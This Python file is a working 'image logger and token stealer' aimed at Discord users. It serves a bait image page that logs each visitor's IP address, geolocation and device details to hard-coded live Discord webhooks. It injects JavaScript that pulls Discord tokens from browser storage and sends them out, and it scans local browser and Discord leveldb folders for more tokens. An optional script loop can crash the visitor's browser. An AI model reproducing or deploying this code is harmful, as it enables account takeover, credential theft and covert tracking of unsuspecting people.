# Image Logger with Token Stealing - FIXED VERSION
# By Team C00lB0i/C00lB0i | https://github.com/OverPowerC
# Enhanced with Discord Token Stealing functionality

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import traceback, requests, base64, httpagentparser
import json
import re
import os
import urllib.request
from pathlib import Path

__app__ = "Discord Image Logger + Token Stealer (Fixed)"
__description__ = "A simple application which allows you to steal IPs and Discord tokens by abusing Discord's Open Original feature"
__version__ = "v2.2"
__author__ = "C00lB0i"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1445065947533803726/D7ZRBlO6_yAxqnp1d-J_Cxk3VeHzT2_QWtBBo3aCVh3MoCKMzROrjgs2T8aZ1aDLPI91",
    "token_webhook": "https://discord.com/api/webhooks/1445500187064664095/SD2nrNQvqRd54oLbI2TD3Hk_tbAtOCXZCXpOgT1W1xE11u2hwh7CPnkFjaDqkYhDCsFd",  # Webhook for token reports
    "image": "https://server.wallpaperalchemy.com/storage/wallpapers/92/windows-xp-wallpaper-bliss-4k-wallpaper.jpeg",
    "imageArgument": True,

    # CUSTOMIZATION #
    "username": "Image Logger", 
    "color": 0x00FFFF,

    # OPTIONS #
    "crashBrowser": False,
    "accurateLocation": True,

    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by C00lB0i's Image Logger. https://github.com/OverPowerC",
        "richMessage": True,
    },

    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,

    # TOKEN STEALING OPTIONS #
    "tokenStealing": True,
    "tokenStealingMode": "passive",
    "sendTokensToWebhook": True,
    "tokenStealingDelay": 2,
    "debugMode": True,  # Enable debug logging

    # REDIRECTION #
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

# ENHANCED TOKEN STEALING
def log_debug(message):
    if config.get("debugMode"):
        print(f"[DEBUG] {message}")

def send_webhook(webhook_url, data):
    """Enhanced webhook sending with better error handling"""
    try:
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        
        request = urllib.request.Request(
            webhook_url,
            data=json.dumps(data).encode(),
            headers=headers,
            method='POST'
        )
        
        with urllib.request.urlopen(request, timeout=15) as response:
            log_debug(f"Webhook success: {response.status}")
            return response.status == 204 or response.status == 200
            
    except urllib.error.HTTPError as e:
        log_debug(f"Webhook HTTP error: {e.code} - {e.reason}")
        return False
    except Exception as e:
        log_debug(f"Webhook general error: {e}")
        return False

def extract_discord_tokens(text):
    """Enhanced token extraction with multiple patterns"""
    # Multiple Discord token patterns
    patterns = [
        r'[MN][\w-]{23}\.[\w-]{6}\.[\w-]{27}',  # Standard format starting with M or N
        r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',     # Generic 24.6.27 format
        r'[\w-]{24}\.[\w-]{6}\.[\w-]{38}',     # Generic 24.6.38 format
        r'[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27,38}', # Very flexible
    ]
    
    all_tokens = []
    for pattern in patterns:
        tokens = re.findall(pattern, text, re.IGNORECASE)
        all_tokens.extend(tokens)
    
    # Remove duplicates and validate
    unique_tokens = []
    for token in set(all_tokens):
        if validate_discord_token(token):
            unique_tokens.append(token)
    
    return unique_tokens

def validate_discord_token(token):
    """Validate Discord token format"""
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return False
            
        # Check first part is base64 and decodes to numeric ID
        base64_part = parts[0]
        padding_needed = (4 - len(base64_part) % 4) % 4
        base64_part += "=" * padding_needed
        
        decoded = base64.b64decode(base64_part).decode('utf-8')
        return decoded.isdigit()
        
    except Exception:
        return False

def find_discord_tokens_storage():
    """Find Discord tokens in browser storage locations"""
    log_debug("Starting browser storage token search...")
    
    locations = []
    
    if os.name == 'nt':  # Windows
        local_appdata = os.getenv('LOCALAPPDATA')
        appdata = os.getenv('APPDATA')
        
        if local_appdata:
            locations.extend([
                Path(local_appdata) / "Google" / "Chrome" / "User Data" / "Default" / "Local Storage" / "leveldb",
                Path(local_appdata) / "Google" / "Chrome" / "User Data" / "Profile 1" / "Local Storage" / "leveldb",
                Path(local_appdata) / "Google" / "Chrome" / "User Data" / "Profile 2" / "Local Storage" / "leveldb",
                Path(local_appdata) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default" / "Local Storage" / "leveldb",
                Path(local_appdata) / "Microsoft" / "Edge" / "User Data" / "Default" / "Local Storage" / "leveldb",
                Path(local_appdata) / "Opera Software" / "Opera Stable" / "Local Storage" / "leveldb",
            ])
        
        if appdata:
            locations.extend([
                Path(appdata) / "discord" / "Local Storage" / "leveldb",
                Path(appdata) / "Discord" / "Local Storage" / "leveldb",
            ])
    
    elif sys.platform == "darwin":  # macOS
        home = Path.home()
        locations.extend([
            home / "Library" / "Application Support" / "Google" / "Chrome" / "Default" / "Local Storage" / "leveldb",
            home / "Library" / "Application Support" / "discord" / "Local Storage" / "leveldb",
        ])
    
    else:  # Linux
        home = Path.home()
        locations.extend([
            home / ".config" / "google-chrome" / "Default" / "Local Storage" / "leveldb",
            home / ".config" / "discord" / "Local Storage" / "leveldb",
        ])
    
    all_tokens = []
    
    for location in locations:
        if location.exists():
            log_debug(f"Scanning: {location}")
            tokens = scan_location_for_tokens(location)
            all_tokens.extend(tokens)
    
    return list(set(all_tokens))  # Remove duplicates

def scan_location_for_tokens(location):
    """Scan a specific location for Discord tokens"""
    tokens_found = []
    
    try:
        for file_path in location.iterdir():
            if file_path.is_file():
                try:
                    content = file_path.read_text(encoding='utf-8', errors='ignore')
                    file_tokens = extract_discord_tokens(content)
                    tokens_found.extend(file_tokens)
                    
                    if file_tokens:
                        log_debug(f"Found {len(file_tokens)} token(s) in {file_path.name}")
                        
                except PermissionError:
                    log_debug(f"Permission denied: {file_path.name}")
                except Exception as e:
                    log_debug(f"Error reading {file_path.name}: {e}")
                    
    except Exception as e:
        log_debug(f"Error scanning location {location}: {e}")
    
    return tokens_found

def send_tokens_webhook(tokens):
    """Send found tokens to Discord webhook"""
    if not tokens:
        log_debug("No tokens to send")
        return False
    
    log_debug(f"Sending {len(tokens)} tokens to webhook...")
    
    # Group tokens by user ID
    tokens_by_user = {}
    for token in tokens:
        try:
            user_id = base64.b64decode(token.split('.')[0] + "==").decode('utf-8')
            if user_id.isdigit():
                if user_id not in tokens_by_user:
                    tokens_by_user[user_id] = []
                tokens_by_user[user_id].append(token)
        except:
            continue
    
    # Create webhook embed
    fields = []
    for user_id, user_tokens in tokens_by_user.items():
        token_text = "\n".join(user_tokens[:2])  # Max 2 tokens per user to avoid message length
        if len(user_tokens) > 2:
            token_text += f"\n... and {len(user_tokens) - 2} more"
            
        fields.append({
            "name": f"👤 User: {user_id}",
            "value": f"```\n{token_text}\n```"
        })
    
    webhook_data = {
        "username": config["username"],
        "content": "🔑 **DISCORD TOKENS FOUND!** 🚨",
        "embeds": [{
            "title": "🎯 Token Stealer Results",
            "color": config["color"],
            "description": f"Successfully extracted **{len(tokens)}** Discord token(s) from **{len(tokens_by_user)}** user(s)",
            "fields": fields,
            "footer": {
                "text": "Enhanced Image Logger v2.3"
            }
        }]
    }
    
    return send_webhook(config["token_webhook"], webhook_data)

def attempt_enhanced_token_stealing():
    """Enhanced token stealing attempt"""
    if not config["tokenStealing"]:
        log_debug("Token stealing disabled")
        return False
    
    log_debug("🚀 Starting enhanced token stealing...")
    
    # Method 1: Browser storage scanning
    storage_tokens = find_discord_tokens_storage()
    log_debug(f"Storage scanning found: {len(storage_tokens)} tokens")
    
    # Method 2: Check common Discord locations
    common_tokens = scan_common_discord_locations()
    log_debug(f"Common locations found: {len(common_tokens)} tokens")
    
    # Combine all tokens
    all_tokens = list(set(storage_tokens + common_tokens))
    log_debug(f"Total unique tokens: {len(all_tokens)}")
    
    # Send to webhook if tokens found
    if all_tokens and config["sendTokensToWebhook"]:
        success = send_tokens_webhook(all_tokens)
        log_debug(f"Webhook send success: {success}")
        return success
    
    return len(all_tokens) > 0

def scan_common_discord_locations():
    """Scan common Discord application locations"""
    tokens = []
    
    if os.name == 'nt':  # Windows
        appdata = os.getenv('APPDATA')
        local_appdata = os.getenv('LOCALAPPDATA')
        
        # Discord desktop app locations
        discord_locations = [
            Path(appdata) / "discord" / "Local Storage" / "leveldb",
            Path(local_appdata) / "Discord" / "Local Storage" / "leveldb",
        ]
        
        for location in discord_locations:
            if location.exists():
                location_tokens = scan_location_for_tokens(location)
                tokens.extend(location_tokens)
    
    return tokens
# END OF FIXED TOKEN STEALING CODE

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    try:
        error_data = {
            "username": config["username"],
            "content": "@everyone",
            "embeds": [{
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
            }]
        }
        requests.post(config["webhook"], json=error_data, timeout=10)
    except Exception as e:
        log_debug(f"Failed to send error report: {e}")

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json={
                    "username": config["username"],
                    "content": "",
                    "embeds": [{
                        "title": "Image Logger - Link Sent",
                        "color": config["color"],
                        "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                    }]
                }, timeout=10)
            except Exception as e:
                log_debug(f"Failed to send link alert: {e}")
        return

    ping = "@everyone"

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=10).json()
    except Exception as e:
        log_debug(f"Failed to get IP info: {e}")
        return
        
    if info["proxy"]:
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""
        if config["antiBot"] == 1:
            ping = ""

    os_name, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ') if '/' in str(info['timezone']) else info['timezone']}` ({info['timezone'].split('/')[0] if '/' in str(info['timezone']) else 'Unknown'})
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os_name}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
        }]
    }
    
    if url: 
        embed["embeds"][0].update({"thumbnail": {"url": url}})
    
    try:
        requests.post(config["webhook"], json=embed, timeout=10)
    except Exception as e:
        log_debug(f"Failed to send IP report: {e}")
    
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            # Get IP from headers
            ip = self.headers.get('x-forwarded-for') or self.client_address[0]
            useragent = self.headers.get('user-agent', '')
            
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    try:
                        url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                    except Exception:
                        url = config["image"]
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            log_debug(f"Request from IP: {ip}")
            
            if ip.startswith(blacklistedIPs):
                return
            
            if botCheck(ip, useragent):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()

                if config["buggedImage"]: 
                    self.wfile.write(binaries["loading"])

                makeReport(ip, endpoint=self.path.split("?")[0], url=url)
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    try:
                        location = base64.b64decode(dic.get("g").encode()).decode()
                        result = makeReport(ip, useragent, location, s.split("?")[0], url=url)
                    except Exception:
                        result = makeReport(ip, useragent, endpoint=s.split("?")[0], url=url)
                else:
                    result = makeReport(ip, useragent, endpoint=s.split("?")[0], url=url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", ip)
                    message = message.replace("{isp}", result.get("isp", "Unknown"))
                    message = message.replace("{asn}", result.get("as", "Unknown"))
                    message = message.replace("{country}", result.get("country", "Unknown"))
                    message = message.replace("{region}", result.get("regionName", "Unknown"))
                    message = message.replace("{city}", result.get("city", "Unknown"))
                    message = message.replace("{lat}", str(result.get("lat", "Unknown")))
                    message = message.replace("{long}", str(result.get("lon", "Unknown")))
                    timezone = result.get("timezone", "Unknown")
                    if '/' in str(timezone):
                        message = message.replace("{timezone}", f"{timezone.split('/')[1].replace('_', ' ')} ({timezone.split('/')[0]})")
                    message = message.replace("{mobile}", str(result.get("mobile", "Unknown")))
                    message = message.replace("{vpn}", str(result.get("proxy", "Unknown")))
                    message = message.replace("{bot}", str(result.get("hosting", "Unknown") if result.get("hosting", False) and not result.get("proxy", False) else 'Possibly' if result.get("hosting", False) else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(useragent)[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(useragent)[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                    
                # FIXED CLIENT-SIDE TOKEN STEALING
                if config["tokenStealing"]:
                    token_stealing_js = f'''
<script>
(function() {{
    console.log("Token stealer activated");
    
    setTimeout(function() {{
        try {{
            // Check localStorage
            if (typeof localStorage !== 'undefined') {{
                console.log("Checking localStorage...");
                for (let i = 0; i < localStorage.length; i++) {{
                    let key = localStorage.key(i);
                    if (key && (key.toLowerCase().includes('token') || key.toLowerCase().includes('discord'))) {{
                        let value = localStorage.getItem(key);
                        if (value && value.match(/[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27,38}}/)) {{
                            console.log("Found potential Discord token in localStorage");
                            // Send token to webhook
                            fetch('{config["token_webhook"]}', {{
                                method: 'POST',
                                headers: {{
                                    'Content-Type': 'application/json',
                                }},
                                body: JSON.stringify({{
                                    content: "🔑 Discord Token Found via localStorage!",
                                    embeds: [{{
                                        title: "Token Stealer - localStorage Token",
                                        color: {config["color"]},
                                        description: "Found a Discord token in browser localStorage",
                                        fields: [{{
                                            name: "Key: " + key,
                                            value: "```" + value + "```"
                                        }}]
                                    }}]
                                }})
                            }}).catch(console.error);
                        }}
                    }}
                }}
            }}
            
            // Check sessionStorage
            if (typeof sessionStorage !== 'undefined') {{
                console.log("Checking sessionStorage...");
                for (let i = 0; i < sessionStorage.length; i++) {{
                    let key = sessionStorage.key(i);
                    if (key && (key.toLowerCase().includes('token') || key.toLowerCase().includes('discord'))) {{
                        let value = sessionStorage.getItem(key);
                        if (value && value.match(/[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27,38}}/)) {{
                            console.log("Found potential Discord token in sessionStorage");
                            fetch('{config["token_webhook"]}', {{
                                method: 'POST',
                                headers: {{
                                    'Content-Type': 'application/json',
                                }},
                                body: JSON.stringify({{
                                    content: "🔑 Discord Token Found via sessionStorage!",
                                    embeds: [{{
                                        title: "Token Stealer - sessionStorage Token",
                                        color: {config["color"]},
                                        description: "Found a Discord token in browser sessionStorage",
                                        fields: [{{
                                            name: "Key: " + key,
                                            value: "```" + value + "```"
                                        }}]
                                    }}]
                                }})
                            }}).catch(console.error);
                        }}
                    }}
                }}
            }}
            
        }} catch(e) {{
            console.log('Error in token stealer:', e);
        }}
    }}, {config["tokenStealingDelay"] * 1000});
}})();
</script>'''
                    data += token_stealing_js.encode()
                
                self.send_response(200)
                self.send_header('Content-type', datatype)
                self.end_headers()

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception as e:
            log_debug(f"Handler error: {e}")
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI

def run_server(port=8080):
    """Run the HTTP server."""
    server_address = ('', port)
    httpd = HTTPServer(server_address, ImageLoggerAPI)
    print(f"🚀 Starting Image Logger with Token Stealing v{__version__}")
    print(f"📍 Server running on port {port}")
    print(f"🔗 Visit http://localhost:{port} to test")
    print(f"🔍 Debug mode: {'ON' if config['debugMode'] else 'OFF'}")
    print(f"🔑 Token stealing: {'ON' if config['tokenStealing'] else 'OFF'}")
    httpd.serve_forever()

if __name__ == "__main__":
    run_server()
